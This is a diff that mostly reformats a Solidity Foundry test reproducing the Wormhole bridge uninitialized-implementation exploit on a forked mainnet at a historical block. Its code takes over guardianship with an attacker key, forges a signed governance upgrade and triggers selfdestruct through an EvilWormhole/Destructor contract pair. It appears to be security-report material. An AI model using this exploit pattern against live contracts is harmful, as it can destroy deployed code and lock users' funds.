@@ -8,34 +8,37 @@ import {BytesLib} from "../../utils/BytesLib.sol";
 import {TestHarness} from "../../TestHarness.sol";
 
 interface Structs {
-	struct Signature {
-		bytes32 r;
-		bytes32 s;
-		uint8 v;
-		uint8 guardianIndex;
-	}
+    struct Signature {
+        bytes32 r;
+        bytes32 s;
+        uint8 v;
+        uint8 guardianIndex;
+    }
 
-	struct VM {
-		uint8 version;
-		uint32 timestamp;
-		uint32 nonce;
-		uint16 emitterChainId;
-		bytes32 emitterAddress;
-		uint64 sequence;
-		uint8 consistencyLevel;
-		bytes payload;
-
-		uint32 guardianSetIndex;
-		Signature[] signatures;
-
-		bytes32 hash;
-	}
+    struct VM {
+        uint8 version;
+        uint32 timestamp;
+        uint32 nonce;
+        uint16 emitterChainId;
+        bytes32 emitterAddress;
+        uint64 sequence;
+        uint8 consistencyLevel;
+        bytes payload;
+        uint32 guardianSetIndex;
+        Signature[] signatures;
+        bytes32 hash;
+    }
 }
 
-interface IWormholeProxy { }
+interface IWormholeProxy {}
 
 interface IWormholeImpl {
-    function initialize(address[] memory initialGuardians, uint16 chainId, uint16 governanceChainId, bytes32 governanceContract) external;
+    function initialize(
+        address[] memory initialGuardians,
+        uint16 chainId,
+        uint16 governanceChainId,
+        bytes32 governanceContract
+    ) external;
     function governanceChainId() external view returns (uint16);
     function governanceContract() external view returns (bytes32);
     function getCurrentGuardianSetIndex() external view returns (uint32);
@@ -43,24 +46,21 @@ interface IWormholeImpl {
 }
 
 contract EvilWormhole {
-
-  function initialize() external {
-    Destructor des = new Destructor();
-    (bool success, ) = address(des).delegatecall(abi.encodeWithSignature("destruct()"));
-    require(success);
-  }
+    function initialize() external {
+        Destructor des = new Destructor();
+        (bool success,) = address(des).delegatecall(abi.encodeWithSignature("destruct()"));
+        require(success);
+    }
 }
 
 contract Destructor {
-
-  function destruct() external {
-    console.log("[3] Self-destructing...");
-    selfdestruct(payable(address(this)));
-  }
+    function destruct() external {
+        console.log("[3] Self-destructing...");
+        selfdestruct(payable(address(this)));
+    }
 }
 
-contract Report_Wormhole is TestHarness {  
-
+contract Report_Wormhole is TestHarness {
     IWormholeImpl internal wormholeImpl = IWormholeImpl(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d);
     uint256 attackerPrivateKey = 0xd0bbd8230a18b0b51c4934271cb8f6a9638ab171a7c6d570777b14c0ed58a5a1;
     uint256[] attackerKeys = [attackerPrivateKey];
@@ -69,18 +69,21 @@ contract Report_Wormhole is TestHarness {
     EvilWormhole evilWormhole;
 
     // We split the test into setUp() and test_attack() because a selfdestruction is involved.
-    // As selfdestruct is enqueued for the end of the call, two independent calls need to happen for this to impact on Foundry's VM.
+    // As selfdestruct is enqueued for the end of the call, two independent calls need to happen for this to
+    // impact on Foundry's VM.
     function setUp() external {
         Structs.VM memory vm;
         bytes memory _vm;
         bytes32 HASH_ZERO = 0x0000000000000000000000000000000000000000000000000000000000000000;
-        uint size;
+        uint256 size;
 
-        // Wormhome last upgraded their implementation contract submitContractUpgrade() at tx hash: https://etherscan.io/tx/0xd45111d7c22a4ba4a1cd110c8224859000fcb0cd5cefd02bd40434ac42a07be6
+        // Wormhome last upgraded their implementation contract submitContractUpgrade() at tx hash:
+        // https://etherscan.io/tx/0xd45111d7c22a4ba4a1cd110c8224859000fcb0cd5cefd02bd40434ac42a07be6
         // at blockNumber: 13818843
-        // Wormhole initialized the implementation initialize(), fixing the issue, at tx hash: https://etherscan.io/tx/0x9acb2b580aba4f5be75366255800df5f62ede576619cb5ce638cedc61273a50f
+        // Wormhole initialized the implementation initialize(), fixing the issue, at tx hash:
+        // https://etherscan.io/tx/0x9acb2b580aba4f5be75366255800df5f62ede576619cb5ce638cedc61273a50f
         // at blockNumber: 14269474
-        cheat.createSelectFork("mainnet", 13818843);
+        cheat.createSelectFork(cheat.envString("RPC_URL"), 13_818_843);
 
         evilWormhole = new EvilWormhole();
         console.log("Evil contract @", address(evilWormhole));
@@ -92,15 +95,15 @@ contract Report_Wormhole is TestHarness {
 
         bytes memory payload = buildPayload(address(evilWormhole));
         _vm = signAndEncodeVM(
-                0,
-                0,
-                wormholeImpl.governanceChainId(),
-                wormholeImpl.governanceContract(),
-                0,
-                payload,
-                attackerKeys,
-                wormholeImpl.getCurrentGuardianSetIndex(),
-                2
+            0,
+            0,
+            wormholeImpl.governanceChainId(),
+            wormholeImpl.governanceContract(),
+            0,
+            payload,
+            attackerKeys,
+            wormholeImpl.getCurrentGuardianSetIndex(),
+            2
         );
         vm = parseVM(_vm);
 
@@ -110,9 +113,8 @@ contract Report_Wormhole is TestHarness {
     }
 
     function test_attack() external {
-
         address addr = address(wormholeImpl);
-        uint size = codeSize(addr);
+        uint256 size = codeSize(addr);
 
         dumpCode(addr, size);
         assertEq(size, 0);
@@ -120,54 +122,48 @@ contract Report_Wormhole is TestHarness {
 
     // Helper functions
     function signAndEncodeVM(
-        int32 timestamp, 
+        int32 timestamp,
         uint32 nonce,
-        uint16 emitterChainId, 
-        bytes32 emitterAddress, 
-        uint64 sequence, 
+        uint16 emitterChainId,
+        bytes32 emitterAddress,
+        uint64 sequence,
         bytes memory data,
         uint256[] memory signers,
         uint32 guardianSetIndex,
-        uint8 consistencyLevel) internal returns (bytes memory) {
+        uint8 consistencyLevel
+    ) internal returns (bytes memory) {
+        bytes memory vm;
+        bytes32 hash;
+        bytes memory signatures;
+        bytes memory body = abi.encodePacked(
+            uint32(timestamp),
+            uint32(nonce),
+            uint16(emitterChainId),
+            bytes32(emitterAddress),
+            uint64(sequence),
+            uint8(consistencyLevel),
+            bytes(data)
+        );
 
-      bytes memory vm;
-      bytes32 hash;
-      bytes memory signatures;
-      bytes memory body = abi.encodePacked(
-                                uint32(timestamp),
-                                uint32(nonce),
-                                uint16(emitterChainId),
-                                bytes32(emitterAddress),
-                                uint64(sequence),
-                                uint8(consistencyLevel),
-                                bytes(data)
-      );
+        hash = keccak256(abi.encodePacked(keccak256(body)));
+        (uint8 v, bytes32 r, bytes32 s) = cheat.sign(attackerPrivateKey, hash);
+        uint8 recoveryParam = ((v - 27) != 0) ? 1 : 0;
 
-      hash = keccak256(abi.encodePacked(keccak256(body)));
-      (uint8 v, bytes32 r, bytes32 s) = cheat.sign(attackerPrivateKey, hash);
-      uint8 recoveryParam = ((v - 27) != 0) ? 1 : 0;
+        signatures = abi.encodePacked(
+            uint8(0), // index - single signature
+            bytes32(r),
+            bytes32(s),
+            uint8(recoveryParam)
+        );
 
-      signatures = abi.encodePacked(
-                        uint8(0), // index - single signature
-                        bytes32(r),
-                        bytes32(s),
-                        uint8(recoveryParam)
-      );
+        vm = abi.encodePacked(uint8(1), uint32(guardianSetIndex), uint8(signers.length), signatures, body);
 
-      vm = abi.encodePacked(
-                  uint8(1),
-                  uint32(guardianSetIndex),
-                  uint8(signers.length),
-                  signatures,
-                  body
-      );
-
-      return vm;
+        return vm;
     }
 
     // Adapted version of https://etherscan.io/address/0x736d2a394f7810c17b3c6fed017d5bc7d60c077d#code#F5#L95
     function parseVM(bytes memory encodedVM) public pure virtual returns (Structs.VM memory vm) {
-        uint index = 0;
+        uint256 index = 0;
 
         vm.version = BytesLib.toUint8(encodedVM, index);
         index += 1;
@@ -180,7 +176,7 @@ contract Report_Wormhole is TestHarness {
         uint256 signersLen = BytesLib.toUint8(encodedVM, index);
         index += 1;
         vm.signatures = new Structs.Signature[](signersLen);
-        for (uint i = 0; i < signersLen; i++) {
+        for (uint256 i = 0; i < signersLen; i++) {
             vm.signatures[i].guardianIndex = BytesLib.toUint8(encodedVM, index);
             index += 1;
 
@@ -218,34 +214,32 @@ contract Report_Wormhole is TestHarness {
         vm.payload = BytesLib.slice(encodedVM, index, encodedVM.length - index);
     }
 
-    function codeSize(address addr) internal view returns (uint) {
-        uint size;
+    function codeSize(address addr) internal view returns (uint256) {
+        uint256 size;
 
         assembly {
-          size := extcodesize(addr)
+            size := extcodesize(addr)
         }
         return size;
     }
 
-    function dumpCode(address addr, uint size) internal {
+    function dumpCode(address addr, uint256 size) internal {
         bytes memory bytecode;
-        
-        if (size >= 32)
-          bytecode = BytesLib.slice(addr.code, 0, 32);
-        else
-          bytecode = addr.code;
-        
+
+        if (size >= 32) {
+            bytecode = BytesLib.slice(addr.code, 0, 32);
+        } else {
+            bytecode = addr.code;
+        }
+
         console.log("Wormhole Bridge implementation @", addr);
         emit log_named_bytes("Wormhole Bridge implementation bytecode", bytecode);
         console.log("");
     }
 
     function buildPayload(address target) internal pure returns (bytes memory) {
-        bytes memory STUB = hex'00000000000000000000000000000000000000000000000000000000436f726501';
-        bytes memory addressEncoded = abi.encodePacked(
-                                uint112(0),
-                                address(target)
-        );
+        bytes memory STUB = hex"00000000000000000000000000000000000000000000000000000000436f726501";
+        bytes memory addressEncoded = abi.encodePacked(uint112(0), address(target));
         bytes memory payload = BytesLib.concat(STUB, addressEncoded);
 
         return payload;
